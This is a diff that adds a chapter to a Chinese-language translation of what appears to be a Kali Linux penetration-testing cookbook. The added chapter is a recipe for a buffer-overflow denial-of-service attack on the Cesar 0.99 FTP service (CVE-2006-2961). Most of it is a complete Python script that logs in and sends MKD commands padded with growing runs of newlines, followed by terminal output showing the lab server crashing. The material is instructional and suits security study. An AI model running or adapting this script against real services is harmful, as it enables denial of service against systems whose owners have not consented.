@@ -122,3 +122,92 @@ There is no indication that the server has crashed
 ### 工作原理
 
 一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本会返回一个标志，表示后续的载荷无法发送，并且服务器可能已崩溃。
+
+## 6.2 FTP 远程服务的缓冲区溢出 DoS 攻击
+
+在正确的情况下，输入数据可能逃离其指定的缓冲区并流入相邻的寄存器或内存段。 此过程将中断执行流程并导致应用程序或系统崩溃。 在某些情况下，缓冲区溢出漏洞也可以用于执行未经授权的代码。 在这个特定的秘籍中，我们基于 Cesar 0.99 FTP 服务的缓冲区溢出，展示如何执行 DoS 攻击的示例。
+
+### 准备
+
+为了执行远程模糊测试，你需要有一个运行 TCP 或 UDP 网络服务的系统。 在提供的示例中，使用了拥有 FTP 服务的 Windows XP 系统。 有关设置 Windows 系统的更多信息，请参阅本书第一章的“安装 Windows Server”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+有一个公开披露的漏洞与 Cesar 0.99 FTP 服务相关。 此漏洞由常见漏洞和披露（CVE）编号系统定义为 CVE-2006-2961。 通过对此漏洞进行研究，显然可以通过向 MKD 函数发送换行字符的验证后序列，来触发基于栈的缓冲区溢出。 为了避免将`\ n`转义序列传递给 Python 脚本，以及之后在提供的输入中正确解释它的相关困难，我们应该修改先前秘籍中讨论的脚本。 然后，我们可以使用修改的脚本来利用此现有漏洞：
+
+```py
+#!/usr/bin/python
+
+import socket 
+import sys
+
+if len(sys.argv) != 5:   
+    print "Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum]"   
+    print "Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000"   
+    print "Example will fuzz the defined FTP service with a series of line break "   
+    print "characters to include 100 '\\n's, 200 '\\n's, etc... up to the maximum of 1000"   
+    sys.exit()
+
+target = str(sys.argv[1]) 
+port = int(sys.argv[2]) 
+i = int(sys.argv[3]) 
+interval = int(sys.argv[3]) 
+max = int(sys.argv[4]) 
+user = raw_input(str("Enter ftp username: ")) 
+passwd = raw_input(str("Enter ftp password: ")) 
+command = raw_input(str("Enter FTP command to fuzz: "))
+
+while i <= max:   
+    try:      
+        payload = command + " " + ('\n' * i)      
+        print "Sending " + str(i) + " line break characters to target"      
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        connect=s.connect((target,port))      
+        s.recv(1024)
+        s.send('USER ' + user + '\r\n')
+        s.recv(1024)
+        s.send('PASS ' + passwd + '\r\n')
+        s.recv(1024)
+        s.send(payload + '\r\n')
+        s.send('QUIT\r\n')
+        s.recv(1024)
+        s.close()
+        i = i + interval
+    except:
+        print "\nUnable to send...Server may have crashed"
+        sys.exit()
+
+print "\nThere is no indication that the server has crashed" 
+```
+
+对脚本所做的修改包括，修改使用描述和删除作为提供的参数的载荷，然后将换行载荷硬编码到要按顺序发送的脚本中。
+
+```
+root@KaliLinux:~# ./ftp_fuzz.py 
+Usage - ./ftp_fuzz.py [Target-IP] [Port Number] [Interval] [Maximum] 
+Example - ./ftp_fuzz.py 10.0.0.5 21 100 1000 
+Example will fuzz the defined FTP service with a series of line break characters to include 100 '\n's, 200 '\n's, etc... up to the maximum of 1000 
+root@KaliLinux:~# ./ftp_fuzz.py 172.16.36.134 21 100 1000 
+Enter ftp username: anonymous 
+Enter ftp password: user@mail.com 
+Enter FTP command to fuzz: MKD 
+Sending 100 line break characters to target 
+Sending 200 line break characters to target 
+Sending 300 line break characters to target 
+Sending 400 line break characters to target 
+Sending 500 line break characters to target 
+Sending 600 line break characters to target 
+Sending 700 line break characters to target 
+^C 
+Unable to send...Server may have crashed
+```
+
+如果脚本在没有适当数量的系统参数的情况下执行，脚本将返回预期的用法。 然后，我们可以执行脚本并发送一系列载荷，它们的数量为 100 的倍数，最大为 1000。在发送 700 个换行符的载荷后，脚本停止发送载荷，并处于空闲状态。 在一段时间不活动后，脚本使用`Ctrl + C`被强制关闭。脚本表示它已经无法发送字符，并且远程服务器可能已经崩溃。 看看下面的截图：
+
+![](img/6-2-1.jpg)
+
+通过返回到运行 Cesar 0.99 FTP 服务的 Windows XP 主机，我们可以看到`server.exe`应用程序崩溃了。 要在拒绝服务后恢复操作，必须手动重新启动 Cesar FTP 服务。
+
+### 工作原理
+
+一般来说，缓冲区溢出能够导致拒绝服务，因为它们可能导致任意数据被加载到非预期的内存段。 这可能中断执行流程，并导致服务或操作系统崩溃。 此秘籍中讨论的特定脚本的工作原理是，在服务或操作系统崩溃的情况下，套接字将不再接受输入，并且脚本将无法完成整个有效载荷注入序列。 如果发生这种情况，脚本需要使用`Ctrl + C`强制关闭。在这种情况下，脚本将返回一个标识，表明后续载荷无法发送，并且服务器可能已崩溃。
